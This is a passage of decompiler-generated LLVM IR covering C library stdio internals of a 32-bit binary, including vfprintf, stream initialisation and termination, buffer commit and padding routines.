  br i1 %v1_804e6ad, label %entry.dec_label_pc_804e6ce_crit_edge, label %dec_label_pc_804e6af

entry.dec_label_pc_804e6ce_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804e6ce

dec_label_pc_804e6af:                             ; preds = %entry
  %v1_804e6af = add i32 %v0_804e6a2, 56
  store i32 %v1_804e6af, i32* @ebx, align 4
  store i32 %v12_804e69f, i32* @eax, align 4
  %v2_804e6be = call i32 @__pthread_return_void(i32 %v12_804e69f, i32 134550239)
  %v0_804e6c3 = load i32, i32* @ebx, align 4
  %v1_804e6c6 = call i32 @__pthread_return_0(i32 %v0_804e6c3)
  %v0_804e6d0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e6ce

dec_label_pc_804e6ce:                             ; preds = %entry.dec_label_pc_804e6ce_crit_edge, %dec_label_pc_804e6af
  %v0_804e6d0 = phi i32 [ %v0_804e6a2, %entry.dec_label_pc_804e6ce_crit_edge ], [ %v0_804e6d0.pre, %dec_label_pc_804e6af ]
  %v0_804e6ce = load i32, i32* @ecx, align 4
  %v4_804e6d5 = inttoptr i32 %arg1 to i8*
  %v5_804e6d5 = call i32 @__GI_fputs_unlocked(i8* %v4_804e6d5, i32 %v0_804e6d0, i32 %v0_804e6ce, i32 %v0_804e6ce)
  %v10_804e6dd = icmp eq i32 %v5_804e6d5, -1
  store i32 %v5_804e6d5, i32* @ebx, align 4
  br i1 %v10_804e6dd, label %dec_label_pc_804e6fa, label %dec_label_pc_804e6e4

dec_label_pc_804e6e4:                             ; preds = %dec_label_pc_804e6ce
  %v0_804e6e4 = load i32, i32* @edx, align 4
  %v0_804e6e6 = load i32, i32* @esi, align 4
  %v5_804e6e9 = call i32 @putc_unlocked(i8 10, i32 %v0_804e6e6, i32 %v0_804e6e4, i32 %v0_804e6e4)
  %v8_804e6f1 = icmp eq i32 %v5_804e6e9, -1
  %v1_804e6f2 = icmp eq i1 %v8_804e6f1, false
  br i1 %v1_804e6f2, label %dec_label_pc_804e6f9, label %dec_label_pc_804e6f4

dec_label_pc_804e6f4:                             ; preds = %dec_label_pc_804e6e4
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_804e6fa

dec_label_pc_804e6f9:                             ; preds = %dec_label_pc_804e6e4
  %v0_804e6f9 = load i32, i32* @ebx, align 4
  %v1_804e6f9 = add i32 %v0_804e6f9, 1
  store i32 %v1_804e6f9, i32* @ebx, align 4
  br label %dec_label_pc_804e6fa

dec_label_pc_804e6fa:                             ; preds = %dec_label_pc_804e6ce, %dec_label_pc_804e6f4, %dec_label_pc_804e6f9
  %v0_804e7126 = phi i32 [ %v5_804e6d5, %dec_label_pc_804e6ce ], [ -1, %dec_label_pc_804e6f4 ], [ %v1_804e6f9, %dec_label_pc_804e6f9 ]
  br i1 %v1_804e6ad, label %dec_label_pc_804e70f, label %dec_label_pc_804e6fe

dec_label_pc_804e6fe:                             ; preds = %dec_label_pc_804e6fa
  store i32 %v12_804e69f, i32* @eax, align 4
  %v2_804e707 = call i32 @__pthread_return_void(i32 %v12_804e69f, i32 1)
  %v0_804e712.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e70f

dec_label_pc_804e70f:                             ; preds = %dec_label_pc_804e6fa, %dec_label_pc_804e6fe
  %v0_804e712 = phi i32 [ %v0_804e7126, %dec_label_pc_804e6fa ], [ %v0_804e712.pre, %dec_label_pc_804e6fe ]
  store i32 %v0_804e69e, i32* @ebx, align 4
  store i32 %v0_804e69d, i32* @esi, align 4
  store i32 %v0_804e69c, i32* @edi, align 4
  ret i32 %v0_804e712

; uselistorder directives
  uselistorder i32 %v5_804e6d5, { 1, 2, 0 }
  uselistorder i32 %v12_804e69f, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804e70f, { 1, 0 }
  uselistorder label %dec_label_pc_804e6fa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e6ce, { 1, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e739 = load i32, i32* @edi, align 4
  %v0_804e73a = load i32, i32* @esi, align 4
  %v0_804e73b = load i32, i32* @ebx, align 4
  store i32 %v0_804e73b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e744 = call i32 @__errno_location(i32 %v0_804e73b)
  %v0_804e74c = load i16, i16* @global_var_80556e0.94, align 32
  %v1_804e74c = zext i16 %v0_804e74c to i32
  store i32 %v1_804e74c, i32* @esi, align 4
  %v1_804e753 = inttoptr i32 %v1_804e744 to i32*
  %v2_804e753 = load i32, i32* %v1_804e753, align 4
  store i32 %v2_804e753, i32* %ebp.global-to-local, align 4
  store i32 %v1_804e744, i32* @edi, align 4
  %v1_804e759 = call i32 @isatty(i32 0)
  %v0_804e75e = load i32, i32* @ebx, align 4
  %v2_804e767 = sub i32 %v0_804e75e, %v1_804e759
  %v2_804e76b = mul i32 %v2_804e767, 256
  %v0_804e76e = load i32, i32* @esi, align 4
  %v2_804e76e = xor i32 %v0_804e76e, %v2_804e76b
  %v1_804e770 = trunc i32 %v2_804e76e to i16
  store i16 %v1_804e770, i16* @global_var_80556e0.94, align 32
  %v0_804e777 = load i16, i16* @global_var_8055730.95, align 16
  %v1_804e777 = zext i16 %v0_804e777 to i32
  store i32 %v1_804e777, i32* @esi, align 4
  %v1_804e77e = call i32 @isatty(i32 1)
  %v0_804e783 = load i32, i32* @ebx, align 4
  %v2_804e783 = sub i32 %v0_804e783, %v1_804e77e
  %v2_804e785 = mul i32 %v2_804e783, 256
  %v0_804e788 = load i32, i32* @esi, align 4
  %v2_804e788 = xor i32 %v2_804e785, %v0_804e788
  %v1_804e78a = trunc i32 %v2_804e788 to i16
  store i16 %v1_804e78a, i16* @global_var_8055730.95, align 16
  %v0_804e791 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e791 = load i32, i32* @edi, align 4
  %v2_804e791 = inttoptr i32 %v1_804e791 to i32*
  store i32 %v0_804e791, i32* %v2_804e791, align 4
  %v2_804e796 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e796, i32* @ebx, align 4
  store i32 %v0_804e73a, i32* @esi, align 4
  store i32 %v0_804e739, i32* @edi, align 4
  ret i32 %v1_804e77e

; uselistorder directives
  uselistorder i32 %v1_804e744, { 1, 0 }
  uselistorder i16* @global_var_8055730.95, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804e7a9 = inttoptr i32 %arg1 to i16*
  %v4_804e7a9 = call i32 @memcpy(i16* %v3_804e7a9, i32 ptrtoint (i32* @global_var_8053640.98 to i32), i32 24)
  ret i32 %v4_804e7a9
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e7b2 = load i32, i32* @esi, align 4
  %v0_804e7b3 = load i32, i32* @ebx, align 4
  store i32 %v0_804e7b3, i32* %stack_var_-8, align 4
  %v1_804e7bc = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80556a8.99 to i32))
  store i32 %v1_804e7bc, i32* %eax.global-to-local, align 4
  %v1_804e7c8 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80556c0.100 to i32))
  store i32 %v1_804e7c8, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_80556a4.101 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804e81222 = icmp eq i32 %storemerge21, 0
  %v1_804e81424 = icmp eq i1 %v1_804e81222, false
  br i1 %v1_804e81424, label %dec_label_pc_804e7d5.lr.ph, label %dec_label_pc_804e832.preheader

dec_label_pc_804e7d5.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e7d5

dec_label_pc_804e7d5:                             ; preds = %dec_label_pc_804e7d5.lr.ph, %dec_label_pc_804e7fc
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804e7d5.lr.ph ], [ %storemerge, %dec_label_pc_804e7fc ]
  %v1_804e7d8 = add i32 %storemerge25, 56
  store i32 %v1_804e7d8, i32* @esi, align 4
  %v1_804e7dc = call i32 @__pthread_return_0(i32 %v1_804e7d8)
  store i32 %v1_804e7dc, i32* %eax.global-to-local, align 4
  %v1_804e7e4 = icmp eq i32 %v1_804e7dc, 0
  br i1 %v1_804e7e4, label %dec_label_pc_804e7fc, label %dec_label_pc_804e7e8

dec_label_pc_804e7e8:                             ; preds = %dec_label_pc_804e7d5
  %v0_804e7e8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e7e8 = add i32 %v0_804e7e8, 8
  %v2_804e7e8 = inttoptr i32 %v1_804e7e8 to i32*
  %v3_804e7e8 = load i32, i32* %v2_804e7e8, align 4
  store i32 %v3_804e7e8, i32* %eax.global-to-local, align 4
  %v1_804e7eb = inttoptr i32 %v0_804e7e8 to i16*
  store i16 48, i16* %v1_804e7eb, align 2
  %v0_804e7f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f0 = add i32 %v1_804e7f0, 24
  %v3_804e7f0 = inttoptr i32 %v2_804e7f0 to i32*
  store i32 %v0_804e7f0, i32* %v3_804e7f0, align 4
  %v0_804e7f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f3 = add i32 %v1_804e7f3, 28
  %v3_804e7f3 = inttoptr i32 %v2_804e7f3 to i32*
  store i32 %v0_804e7f3, i32* %v3_804e7f3, align 4
  %v0_804e7f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f6 = add i32 %v1_804e7f6, 16
  %v3_804e7f6 = inttoptr i32 %v2_804e7f6 to i32*
  store i32 %v0_804e7f6, i32* %v3_804e7f6, align 4
  %v0_804e7f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f9 = add i32 %v1_804e7f9, 20
  %v3_804e7f9 = inttoptr i32 %v2_804e7f9 to i32*
  store i32 %v0_804e7f9, i32* %v3_804e7f9, align 4
  br label %dec_label_pc_804e7fc

dec_label_pc_804e7fc:                             ; preds = %dec_label_pc_804e7d5, %dec_label_pc_804e7e8
  %v0_804e7ff = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e7ff = add i32 %v0_804e7ff, 52
  %v2_804e7ff = inttoptr i32 %v1_804e7ff to i32*
  store i32 1, i32* %v2_804e7ff, align 4
  %v0_804e806 = load i32, i32* @esi, align 4
  %v1_804e807 = call i32 @__stdio_init_mutex(i32 %v0_804e806)
  store i32 %v1_804e807, i32* %eax.global-to-local, align 4
  %v0_804e80c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e80c = add i32 %v0_804e80c, 32
  %v2_804e80c = inttoptr i32 %v1_804e80c to i32*
  %storemerge = load i32, i32* %v2_804e80c, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e812 = icmp eq i32 %storemerge, 0
  %v1_804e814 = icmp eq i1 %v1_804e812, false
  br i1 %v1_804e814, label %dec_label_pc_804e7d5, label %dec_label_pc_804e80f.dec_label_pc_804e832.preheader_crit_edge

dec_label_pc_804e80f.dec_label_pc_804e832.preheader_crit_edge: ; preds = %dec_label_pc_804e7fc
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80556a4.101 to i32*), align 4
  br label %dec_label_pc_804e832.preheader

dec_label_pc_804e832.preheader:                   ; preds = %dec_label_pc_804e80f.dec_label_pc_804e832.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e80f.dec_label_pc_804e832.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e8323 = icmp eq i32 %storemerge12, 0
  %v1_804e83410 = icmp eq i1 %v1_804e8323, false
  br i1 %v1_804e83410, label %dec_label_pc_804e81e.preheader, label %dec_label_pc_804e836

dec_label_pc_804e81e.preheader:                   ; preds = %dec_label_pc_804e832.preheader
  br label %dec_label_pc_804e81e

dec_label_pc_804e81e:                             ; preds = %dec_label_pc_804e81e.preheader, %dec_label_pc_804e82f
  %v0_804e826 = phi i32 [ %storemerge1, %dec_label_pc_804e82f ], [ %storemerge12, %dec_label_pc_804e81e.preheader ]
  %v1_804e81e = inttoptr i32 %v0_804e826 to i8*
  %v2_804e81e = load i8, i8* %v1_804e81e, align 1
  %v3_804e81e = and i8 %v2_804e81e, 64
  %v4_804e81e = icmp eq i8 %v3_804e81e, 0
  br i1 %v4_804e81e, label %dec_label_pc_804e82f, label %dec_label_pc_804e823

dec_label_pc_804e823:                             ; preds = %dec_label_pc_804e81e
  %v1_804e827 = call i32 @__stdio_wcommit(i32 %v0_804e826)
  store i32 %v1_804e827, i32* %eax.global-to-local, align 4
  %v0_804e82f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e82f

dec_label_pc_804e82f:                             ; preds = %dec_label_pc_804e81e, %dec_label_pc_804e823
  %v0_804e82f = phi i32 [ %v0_804e826, %dec_label_pc_804e81e ], [ %v0_804e82f.pre, %dec_label_pc_804e823 ]
  %v1_804e82f = add i32 %v0_804e82f, 32
  %v2_804e82f = inttoptr i32 %v1_804e82f to i32*
  %storemerge1 = load i32, i32* %v2_804e82f, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e832 = icmp eq i32 %storemerge1, 0
  %v1_804e834 = icmp eq i1 %v1_804e832, false
  br i1 %v1_804e834, label %dec_label_pc_804e81e, label %dec_label_pc_804e836

dec_label_pc_804e836:                             ; preds = %dec_label_pc_804e82f, %dec_label_pc_804e832.preheader
  %v2_804e836 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e836, i32* %eax.global-to-local, align 4
  %v2_804e837 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e837, i32* @ebx, align 4
  store i32 %v0_804e7b2, i32* @esi, align 4
  ret i32 %v2_804e836

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i16* @global_var_80556e0.94, { 1, 0, 2 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e82f, { 1, 0 }
  uselistorder label %dec_label_pc_804e81e, { 1, 0 }
  uselistorder label %dec_label_pc_804e7fc, { 1, 0 }
  uselistorder label %dec_label_pc_804e7d5, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e83c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e844 = add i32 %arg1, 8
  %v2_804e844 = inttoptr i32 %v1_804e844 to i32*
  %v3_804e844 = load i32, i32* %v2_804e844, align 4
  store i32 %v3_804e844, i32* %edx.global-to-local, align 4
  %v1_804e847 = add i32 %arg1, 16
  %v2_804e847 = inttoptr i32 %v1_804e847 to i32*
  %v3_804e847 = load i32, i32* %v2_804e847, align 4
  %v2_804e84a = sub i32 %v3_804e847, %v3_804e844
  %v12_804e84a = icmp eq i32 %v2_804e84a, 0
  store i32 %v2_804e84a, i32* %eax.global-to-local, align 4
  br i1 %v12_804e84a, label %dec_label_pc_804e85d, label %dec_label_pc_804e84e

dec_label_pc_804e84e:                             ; preds = %entry
  store i32 %v3_804e844, i32* %v2_804e847, align 4
  %v0_804e851 = load i32, i32* @ecx, align 4
  %v0_804e852 = load i32, i32* %eax.global-to-local, align 4
  %v0_804e853 = load i32, i32* %edx.global-to-local, align 4
  %v0_804e854 = load i32, i32* @ebx, align 4
  %v4_804e855 = inttoptr i32 %v0_804e854 to i16*
  %v5_804e855 = call i32 @__stdio_WRITE(i16* %v4_804e855, i32 %v0_804e853, i32 %v0_804e852, i32 %v0_804e851)
  store i32 %v5_804e855, i32* %eax.global-to-local, align 4
  %v0_804e85d.pre = load i32, i32* @ebx, align 4
  %v2_804e863.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e85d

dec_label_pc_804e85d:                             ; preds = %entry, %dec_label_pc_804e84e
  %v2_804e863 = phi i32 [ %tmp11, %entry ], [ %v2_804e863.pre, %dec_label_pc_804e84e ]
  %v0_804e85d = phi i32 [ %arg1, %entry ], [ %v0_804e85d.pre, %dec_label_pc_804e84e ]
  %v1_804e85d = add i32 %v0_804e85d, 16
  %v2_804e85d = inttoptr i32 %v1_804e85d to i32*
  %v3_804e85d = load i32, i32* %v2_804e85d, align 4
  store i32 %v3_804e85d, i32* %eax.global-to-local, align 4
  %v2_804e860 = add i32 %v0_804e85d, 8
  %v3_804e860 = inttoptr i32 %v2_804e860 to i32*
  %v4_804e860 = load i32, i32* %v3_804e860, align 4
  %v5_804e860 = sub i32 %v3_804e85d, %v4_804e860
  store i32 %v5_804e860, i32* %eax.global-to-local, align 4
  store i32 %v2_804e863, i32* @edx, align 4
  store i32 %v0_804e83c, i32* @ebx, align 4
  ret i32 %v5_804e860

; uselistorder directives
  uselistorder i32 %v0_804e85d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e85d, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v12_804e86b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804e86e = ptrtoint i16* %arg1 to i32
  store i32 %v4_804e86e, i32* @esi, align 4
  %v1_804e872 = add i32 %v4_804e86e, 52
  %v2_804e872 = inttoptr i32 %v1_804e872 to i32*
  %v3_804e872 = load i32, i32* %v2_804e872, align 4
  store i32 %v3_804e872, i32* @edi, align 4
  %v1_804e875 = icmp eq i32 %v3_804e872, 0
  %v1_804e877 = icmp eq i1 %v1_804e875, false
  br i1 %v1_804e877, label %dec_label_pc_804e898, label %dec_label_pc_804e879

dec_label_pc_804e879:                             ; preds = %entry
  %v1_804e879 = add i32 %v4_804e86e, 56
  store i32 %v1_804e879, i32* @ebx, align 4
  store i32 %v12_804e86b, i32* @eax, align 4
  %v3_804e888 = call i32 @__pthread_return_void(i32 %v12_804e86b, i32 134550239)
  %v0_804e88d = load i32, i32* @ebx, align 4
  %v2_804e890 = call i32 @__pthread_return_0(i32 %v0_804e88d)
  %v0_804e898.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e898

dec_label_pc_804e898:                             ; preds = %entry, %dec_label_pc_804e879
  %v0_804e8b1 = phi i32 [ %v4_804e86e, %entry ], [ %v0_804e898.pre, %dec_label_pc_804e879 ]
  %v1_804e898 = inttoptr i32 %v0_804e8b1 to i16*
  %v2_804e898 = load i16, i16* %v1_804e898, align 2
  %v1_804e89b = and i16 %v2_804e898, 192
  %v6_804e8a0 = icmp eq i16 %v1_804e89b, 192
  br i1 %v6_804e8a0, label %dec_label_pc_804e898.dec_label_pc_804e8be_crit_edge, label %dec_label_pc_804e8a7

dec_label_pc_804e898.dec_label_pc_804e8be_crit_edge: ; preds = %dec_label_pc_804e898
  br label %dec_label_pc_804e8be

dec_label_pc_804e8a7:                             ; preds = %dec_label_pc_804e898
  %v0_804e8a7 = load i32, i32* @ecx, align 4
  store i32 -1, i32* @ebx, align 4
  %v6_804e8b2 = call i32 @__stdio_trans2w_o(i16* %v1_804e898, i32 128, i32 %v0_804e8a7, i32 %v0_804e8a7)
  %v1_804e8ba = icmp eq i32 %v6_804e8b2, 0
  %v1_804e8bc = icmp eq i1 %v1_804e8ba, false
  br i1 %v1_804e8bc, label %dec_label_pc_804e8d2, label %dec_label_pc_804e8a7.dec_label_pc_804e8be_crit_edge

dec_label_pc_804e8a7.dec_label_pc_804e8be_crit_edge: ; preds = %dec_label_pc_804e8a7
  %v0_804e8c7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e8be

dec_label_pc_804e8be:                             ; preds = %dec_label_pc_804e898.dec_label_pc_804e8be_crit_edge, %dec_label_pc_804e8a7.dec_label_pc_804e8be_crit_edge
  %v0_804e8c7 = phi i32 [ %v0_804e8b1, %dec_label_pc_804e898.dec_label_pc_804e8be_crit_edge ], [ %v0_804e8c7.pre, %dec_label_pc_804e8a7.dec_label_pc_804e8be_crit_edge ]
  %v0_804e8be = load i32, i32* @edx, align 4
  %v5_804e8c8 = inttoptr i32 %arg2 to i8*
  %v6_804e8c8 = call i32 @_vfprintf_internal(i32 %v0_804e8c7, i8* %v5_804e8c8, i32 %arg3, i32 %v0_804e8be)
  store i32 %v6_804e8c8, i32* @ebx, align 4
  br label %dec_label_pc_804e8d2

dec_label_pc_804e8d2:                             ; preds = %dec_label_pc_804e8a7, %dec_label_pc_804e8be
  br i1 %v1_804e877, label %dec_label_pc_804e8e7, label %dec_label_pc_804e8d6

dec_label_pc_804e8d6:                             ; preds = %dec_label_pc_804e8d2
  store i32 %v12_804e86b, i32* @eax, align 4
  %v3_804e8df = call i32 @__pthread_return_void(i32 %v12_804e86b, i32 1)
  br label %dec_label_pc_804e8e7

dec_label_pc_804e8e7:                             ; preds = %dec_label_pc_804e8d2, %dec_label_pc_804e8d6
  %v0_804e8ea = load i32, i32* @ebx, align 4
  ret i32 %v0_804e8ea

; uselistorder directives
  uselistorder i32 %v12_804e86b, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804e8e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e8d2, { 1, 0 }
  uselistorder label %dec_label_pc_804e8be, { 1, 0 }
  uselistorder label %dec_label_pc_804e898, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e8f0 = load i32, i32* @edi, align 4
  %v0_804e8f1 = load i32, i32* @eax, align 4
  store i32 %v0_804e8f1, i32* @edi, align 4
  %v0_804e8f3 = load i32, i32* @esi, align 4
  %v0_804e8f4 = load i32, i32* @ecx, align 4
  store i32 %v0_804e8f4, i32* @esi, align 4
  %v0_804e8f6 = load i32, i32* @ebx, align 4
  store i32 %v0_804e8f4, i32* @ebx, align 4
  %v0_804e8fc = load i32, i32* @edx, align 4
  store i32 %v0_804e8fc, i32* %stack_var_-13, align 4
  %v1_804e9032 = icmp eq i32 %v0_804e8f4, 0
  br i1 %v1_804e9032, label %dec_label_pc_804e91b, label %dec_label_pc_804e907.lr.ph

dec_label_pc_804e907.lr.ph:                       ; preds = %entry
  %v2_804e907 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e907

dec_label_pc_804e902:                             ; preds = %dec_label_pc_804e907
  %v1_804e902 = add i32 %v0_804e902, -1
  %v8_804e902 = icmp eq i32 %v1_804e902, 0
  store i32 %v1_804e902, i32* @ebx, align 4
  br i1 %v8_804e902, label %dec_label_pc_804e91b.loopexit, label %dec_label_pc_804e902.dec_label_pc_804e907_crit_edge

dec_label_pc_804e902.dec_label_pc_804e907_crit_edge: ; preds = %dec_label_pc_804e902
  %v0_804e90b.pre = load i32, i32* @edx, align 4
  %v0_804e90c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e907

dec_label_pc_804e907:                             ; preds = %dec_label_pc_804e902.dec_label_pc_804e907_crit_edge, %dec_label_pc_804e907.lr.ph
  %v0_804e90c = phi i32 [ %v0_804e90c.pre, %dec_label_pc_804e902.dec_label_pc_804e907_crit_edge ], [ %v0_804e8f1, %dec_label_pc_804e907.lr.ph ]
  %v0_804e90b = phi i32 [ %v0_804e90b.pre, %dec_label_pc_804e902.dec_label_pc_804e907_crit_edge ], [ %v0_804e8fc, %dec_label_pc_804e907.lr.ph ]
  %v4_804e910 = call i32 @__stdio_fwrite(i32 %v2_804e907, i32 1, i32 %v0_804e90c, i32 %v0_804e90b)
  %v8_804e918 = icmp eq i32 %v4_804e910, 1
  %v0_804e902 = load i32, i32* @ebx, align 4
  br i1 %v8_804e918, label %dec_label_pc_804e902, label %dec_label_pc_804e91b.loopexit

dec_label_pc_804e91b.loopexit:                    ; preds = %dec_label_pc_804e902, %dec_label_pc_804e907
  %v1_804e91e.ph = phi i32 [ %v0_804e902, %dec_label_pc_804e907 ], [ 0, %dec_label_pc_804e902 ]
  %v0_804e91e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e91b

dec_label_pc_804e91b:                             ; preds = %dec_label_pc_804e91b.loopexit, %entry
  %v0_804e91e = phi i32 [ 0, %entry ], [ %v0_804e91e.pre, %dec_label_pc_804e91b.loopexit ]
  %v1_804e91e = phi i32 [ 0, %entry ], [ %v1_804e91e.ph, %dec_label_pc_804e91b.loopexit ]
  %v2_804e91e = sub i32 %v0_804e91e, %v1_804e91e
  store i32 %v0_804e8f6, i32* @ebx, align 4
  store i32 %v0_804e8f3, i32* @esi, align 4
  store i32 %v0_804e8f0, i32* @edi, align 4
  ret i32 %v2_804e91e

; uselistorder directives
  uselistorder i32 %v1_804e902, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e91b.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e939 = trunc i32 %arg2 to i8
  %v5_804e939 = icmp slt i8 %v3_804e939, 0
  %v1_804e93b = icmp eq i1 %v5_804e939, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e93b, label %dec_label_pc_804e96c, label %dec_label_pc_804e93d

dec_label_pc_804e93d:                             ; preds = %entry
  %v3_804e944 = call i32 @strlen(i8* %arg4)
  %v0_804e94c = load i32, i32* @ebx, align 4
  %v2_804e94c = sub i32 %v0_804e94c, %v3_804e944
  store i32 %v2_804e94c, i32* @ebx, align 4
  store i32 %v3_804e944, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e94c, 1
  br i1 %tmp23, label %dec_label_pc_804e96a, label %dec_label_pc_804e954

dec_label_pc_804e954:                             ; preds = %dec_label_pc_804e93d
  store i32 %arg1, i32* @eax, align 4
  %v0_804e958 = load i32, i32* @edi, align 4
  %v1_804e958 = urem i32 %v0_804e958, 128
  store i32 %v1_804e958, i32* @edi, align 4
  store i32 %v2_804e94c, i32* @ecx, align 4
  store i32 %v1_804e958, i32* @edx, align 4
  %v0_804e95f = call i32 @_charpad()
  %v12_804e964 = icmp eq i32 %v0_804e95f, %v2_804e94c
  store i32 %v0_804e95f, i32* @ebp, align 4
  %v1_804e968 = icmp eq i1 %v12_804e964, false
  br i1 %v1_804e968, label %dec_label_pc_804e986, label %dec_label_pc_804e954.dec_label_pc_804e96a_crit_edge

dec_label_pc_804e954.dec_label_pc_804e96a_crit_edge: ; preds = %dec_label_pc_804e954
  %v0_804e96a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e96a

dec_label_pc_804e96a:                             ; preds = %dec_label_pc_804e954.dec_label_pc_804e96a_crit_edge, %dec_label_pc_804e93d
  %v0_804e96a = phi i32 [ %v0_804e96a.pre, %dec_label_pc_804e954.dec_label_pc_804e96a_crit_edge ], [ %v3_804e944, %dec_label_pc_804e93d ]
  store i32 %v0_804e96a, i32* @ebx, align 4
  br label %dec_label_pc_804e96c

dec_label_pc_804e96c:                             ; preds = %entry, %dec_label_pc_804e96a
  %v0_804e977 = phi i32 [ %arg3, %entry ], [ %v0_804e96a, %dec_label_pc_804e96a ]
  %tmp24 = icmp slt i32 %v0_804e977, 1
  br i1 %tmp24, label %dec_label_pc_804e984, label %dec_label_pc_804e972

dec_label_pc_804e972:                             ; preds = %dec_label_pc_804e96c
  %v0_804e972 = load i32, i32* @ecx, align 4
  %v5_804e97c = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e977, i32 %arg1, i32 %v0_804e972)
  br label %dec_label_pc_804e984

dec_label_pc_804e984:                             ; preds = %dec_label_pc_804e96c, %dec_label_pc_804e972
  %v1_804e984 = phi i32 [ 0, %dec_label_pc_804e96c ], [ %v5_804e97c, %dec_label_pc_804e972 ]
  %v0_804e984 = load i32, i32* @ebp, align 4
  %v2_804e984 = add i32 %v0_804e984, %v1_804e984
  br label %dec_label_pc_804e986

dec_label_pc_804e986:                             ; preds = %dec_label_pc_804e954, %dec_label_pc_804e984
  %v0_804e989 = phi i32 [ %v0_804e95f, %dec_label_pc_804e954 ], [ %v2_804e984, %dec_label_pc_804e984 ]
  ret i32 %v0_804e989

; uselistorder directives
  uselistorder i32 %v0_804e977, { 1, 0 }
  uselistorder i32 %v0_804e95f, { 1, 2, 0 }
  uselistorder i32 %v1_804e958, { 1, 0 }
  uselistorder i32 %v2_804e94c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e986, { 1, 0 }
  uselistorder label %dec_label_pc_804e984, { 1, 0 }
  uselistorder label %dec_label_pc_804e96c, { 1, 0 }
}

